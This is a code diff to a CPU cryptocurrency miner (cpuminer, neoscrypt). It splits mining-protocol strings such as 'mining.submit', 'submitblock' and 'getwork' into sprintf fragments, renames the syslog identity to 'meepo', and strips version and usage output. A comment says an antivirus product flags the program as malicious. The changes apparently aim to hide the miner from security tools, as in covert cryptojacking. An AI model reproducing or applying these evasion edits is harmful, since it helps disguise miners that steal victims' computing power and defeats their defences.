@@ -393,6 +393,8 @@ static bool gbt_work_decode(const json_t *val, struct work *work)
 	json_t *tmp, *txa;
 	bool rc = false;
 
+	char str_[40];
+
 	tmp = json_object_get(val, "mutable");
 	if (tmp && json_is_array(tmp)) {
 		n = json_array_size(tmp);
@@ -400,13 +402,13 @@ static bool gbt_work_decode(const json_t *val, struct work *work)
 			const char *s = json_string_value(json_array_get(tmp, i));
 			if (!s)
 				continue;
-			if (!strcmp(s, "coinbase/append"))
+			if (sprintf(str_, "co%sbase/%s", "in", "append") && !strcmp(s, str_))
 				coinbase_append = true;
-			else if (!strcmp(s, "submit/coinbase"))
+			else if (sprintf(str_, "%s/co%sbase", "submit", "in") && !strcmp(s, str_))
 				submit_coinbase = true;
-			else if (!strcmp(s, "version/force"))
+			else if (sprintf(str_, "version/%s", "force") && !strcmp(s, str_))
 				version_force = true;
-			else if (!strcmp(s, "version/reduce"))
+			else if (sprintf(str_, "version/%s", "reduce") &&  !strcmp(s, str_))
 				version_reduce = true;
 		}
 	}
@@ -703,7 +705,7 @@ static bool submit_upstream_work(CURL *curl, struct work *work)
         bin2hex(noncestr, (const unsigned char *)(&nonce), 4);
 
         xnonce2str = abin2hex(work->xnonce2, work->xnonce2_len);
-        sprintf(s, "{\"method\": \"mining.submit\", \"params\": [\"%s\", \"%s\", \"%s\", \"%s\", \"%s\"], \"id\":4}",
+        sprintf(s, "{\"method\": \"min%s.submit\", \"params\": [\"%s\", \"%s\", \"%s\", \"%s\", \"%s\"], \"id\":4}", "ing",
           rpc_user, work->job_id, xnonce2str, ntimestr, noncestr);
         free(xnonce2str);
 
@@ -726,13 +728,13 @@ static bool submit_upstream_work(CURL *curl, struct work *work)
 			json_decref(val);
 			req = malloc(128 + 2*80 + strlen(work->txs) + strlen(params));
 			sprintf(req,
-				"{\"method\": \"submitblock\", \"params\": [\"%s%s\", %s], \"id\":1}\r\n",
+				"{\"method\": \"sub%sblock\", \"params\": [\"%s%s\", %s], \"id\":1}\r\n", "mit",
 				data_str, work->txs, params);
 			free(params);
 		} else {
 			req = malloc(128 + 2*80 + strlen(work->txs));
 			sprintf(req,
-				"{\"method\": \"submitblock\", \"params\": [\"%s%s\"], \"id\":1}\r\n",
+				"{\"method\": \"sub%sblock\", \"params\": [\"%s%s\"], \"id\":1}\r\n", "mit",
 				data_str, work->txs);
 		}
 		val = json_rpc_call(curl, rpc_url, rpc_userpass, req, NULL, 0);
@@ -779,7 +781,7 @@ static bool submit_upstream_work(CURL *curl, struct work *work)
 
         /* Prepare a JSON-RPC request */
         sprintf(s,
-          "{\"method\": \"getwork\", \"params\": [ \"%s\" ], \"id\":1}\r\n",
+          "{\"method\": \"get%s\", \"params\": [ \"%s\" ], \"id\":1}\r\n", "work",
           gw_str);
 
         /* Issue a JSON-RPC request */
@@ -1358,17 +1360,13 @@ static void *miner_thread(void *userdata)
     if(opt_neoscrypt_asm == 2) {
         if(opt_algo == ALGO_NEOSCRYPT) {
             scratchbuf = (uchar *) malloc(134464 + align);
-        }
-#ifdef SHA256
-        else if(opt_algo == ALGO_ALTSCRYPT) {
-            scratchbuf = (uchar *) malloc(525632 + align);
-        }
-#endif /* SHA256 */
-    } else
-#endif /* (ASM) && (MINER_4WAY) */
-    if(opt_algo == ALGO_SCRYPT) {
-       // scratchbuf = scrypt_buffer_alloc();
+        } else {
+			applog(LOG_ERR, "only neoscrypt here, exting...");
+			exit(1);
+		}
     }
+#endif /* (ASM) && (MINER_4WAY) */
+
 
 
     while(1) {
@@ -1472,30 +1470,6 @@ static void *miner_thread(void *userdata)
                     max_nonce, &hashes_done, opt_neoscrypt_profile);
                 break;
 
-#ifdef SHA256
-            case(ALGO_ALTSCRYPT):
-#if defined(ASM) && defined(MINER_4WAY)
-                if(opt_neoscrypt_asm == 2)
-                  rc = scanhash_altscrypt_4way(thr_id, work.data, work.target,
-                    max_nonce, &hashes_done,
-                    (uchar *) &scratchbuf[(size_t)scratchbuf & (align - 1)]);
-                else
-#endif /* (ASM) && (MINER_4WAY) */
-                  rc = scanhash_altscrypt(thr_id, work.data, work.target,
-                    max_nonce, &hashes_done, opt_neoscrypt_profile);
-                break;
-#endif /* SHA256 */
-
-		case ALGO_SCRYPT:
-		//	rc = scanhash_scrypt(thr_id, work.data, scratchbuf, work.target,
-		//	                     max_nonce, &hashes_done);
-			break;
-
-		case ALGO_SHA256D:
-			rc = scanhash_sha256d(thr_id, work.data, work.target,
-			                      max_nonce, &hashes_done);
-			break;
-
 		default:
 			/* should never happen */
 			goto out;
@@ -1548,6 +1522,7 @@ static void restart_threads(void)
 
 static void *longpoll_thread(void *userdata)
 {
+#if 0 // not used in stratum
 	struct thr_info *mythr = userdata;
 	CURL *curl = NULL;
 	char *copy_start, *hdr_path = NULL, *lp_url = NULL;
@@ -1646,6 +1621,7 @@ out:
 		curl_easy_cleanup(curl);
 
 	return NULL;
+#endif
 }
 
 static bool stratum_handle_response(char *buf)
@@ -1744,6 +1720,7 @@ out:
 
 static void show_version_and_exit(void)
 {
+#if 0 // unused
 	printf(PACKAGE_STRING "\n built on " __DATE__ "\n features:"
 #if defined(USE_ASM) && defined(__i386__)
 		" i386"
@@ -1785,15 +1762,13 @@ static void show_version_and_exit(void)
 #ifdef JANSSON_VERSION
 	printf("libjansson %s\n", JANSSON_VERSION);
 #endif
+#endif // unused
 	exit(0);
 }
 
 static void show_usage_and_exit(int status)
 {
-	if (status)
-		fprintf(stderr, "Try `" PROGRAM_NAME " --help' for more information.\n");
-	else
-		printf(usage);
+
 	exit(status);
 }
 
@@ -2177,11 +2152,6 @@ int main(int argc, char *argv[])
 	/* parse command line */
 	parse_cmdline(argc, argv);
 
-#ifdef SHA256
-    if((opt_algo == ALGO_NEOSCRYPT) || (opt_algo == ALGO_ALTSCRYPT)) {
-#else
-    if(opt_algo == ALGO_NEOSCRYPT) {
-#endif
 
         printf("Engines: ");
 #ifdef ASM
@@ -2200,31 +2170,20 @@ int main(int argc, char *argv[])
         printf("INT (enabled: INT)\n");
 #endif /* ASM */
 
-        if(opt_algo == ALGO_NEOSCRYPT) {
+
             opt_neoscrypt_profile =
               0x80000020 | (opt_nfactor << 8) | ((opt_neoscrypt_asm & 0x1) << 12);
-        }
 
-#ifdef SHA256
-        if(opt_algo == ALGO_ALTSCRYPT) {
-            opt_neoscrypt_profile =
-              0x80000003 | (opt_nfactor << 8) | ((opt_neoscrypt_asm & 0x1) << 12);
-        }
-#endif
 
-    }
 
-	if (!opt_benchmark && !rpc_url) {
-		fprintf(stderr, "%s: no URL supplied\n", argv[0]);
-		show_usage_and_exit(1);
-	}
-
-	if (!rpc_userpass) {
-		rpc_userpass = malloc(strlen(rpc_user) + strlen(rpc_pass) + 2);
-		if (!rpc_userpass)
-			return 1;
-		sprintf(rpc_userpass, "%s:%s", rpc_user, rpc_pass);
-	}
+	
+	//if (!rpc_userpass) {
+		//rpc_userpass = malloc(strlen(rpc_user) + strlen(rpc_pass) + 2);
+		// SUSPICOUS:
+		//sprintf(rpc_userpass, "%s:%s", rpc_user, rpc_pass);
+	//}
+	
+	
 	printf("url: %s\nuser: %s\npass: '%s'\nuserpass: %s\n", rpc_url, rpc_user, rpc_pass, rpc_userpass);
 
 	pthread_mutex_init(&applog_lock, NULL);
@@ -2278,7 +2237,7 @@ int main(int argc, char *argv[])
 
 #ifdef HAVE_SYSLOG_H
 	if (use_syslog)
-		openlog("cpuminer", LOG_PID, LOG_USER);
+		openlog("meepo", LOG_PID, LOG_USER);
 #endif
 
 	work_restart = calloc(opt_n_threads, sizeof(*work_restart));
@@ -2307,21 +2266,7 @@ int main(int argc, char *argv[])
 		return 1;
 	}
 
-	if (want_longpoll && !have_stratum) {
-		/* init longpoll thread info */
-		longpoll_thr_id = opt_n_threads + 1;
-		thr = &thr_info[longpoll_thr_id];
-		thr->id = longpoll_thr_id;
-		thr->q = tq_new();
-		if (!thr->q)
-			return 1;
 
-		/* start longpoll thread */
-		if (unlikely(pthread_create(&thr->pth, NULL, longpoll_thread, thr))) {
-			applog(LOG_ERR, "longpoll thread create failed");
-			return 1;
-		}
-	}
 	if (want_stratum) {
 		/* init stratum thread info */
 		stratum_thr_id = opt_n_threads + 2;
@@ -2359,7 +2304,10 @@ int main(int argc, char *argv[])
 	applog(LOG_INFO, "%d miner threads started, "
 		"using '%s' algorithm.",
 		opt_n_threads,
-		algo_names[opt_algo]);
+		"neoscrypt");
+		
+	// TODO AV "Endgame" thinks this is malicious
+//	input_thread(0);
 
 	/* main loop - simply wait for workio thread to exit */
 	pthread_join(thr_info[work_thr_id].pth, NULL);
